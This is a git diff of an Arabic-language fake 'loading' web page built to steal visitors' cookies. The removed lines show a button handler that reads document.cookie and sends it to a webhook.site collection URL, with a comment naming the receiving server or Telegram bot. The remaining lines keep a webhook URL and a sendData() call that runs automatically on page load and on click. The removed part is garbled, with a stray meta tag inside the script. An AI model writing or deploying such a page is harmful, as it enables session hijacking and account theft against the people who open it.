@@ -2,21 +2,6 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث الصفحة</title>
-</head>
-<body style="text-align: center; padding: 50px; font-family: Tahoma;">
-    <h2>جاري تحميل المحتوى...</h2>
-    <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
-    <button onclick="sendCookies()" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
-
-    <script>
-        function sendCookies() {
-            let cookies = document.cookie;
-
-            // رابط السيرفر الخاص بك أو بوت تلجرام الذي سيستقبل الكوكيز تلقائياً
-            let targetUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436/collect?cookie=" + encodeURIComponent(cookies);
-const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
-<meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
 </head>
@@ -81,6 +66,7 @@ const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
 
         // إرسال تلقائي وعند الضغط
         sendData();
-        document.getElementById("btn").addEventListener("click", sendData);    </script>
+        document.getElementById("btn").addEventListener("click", sendData);
+    </script>
 </body>
 </html>
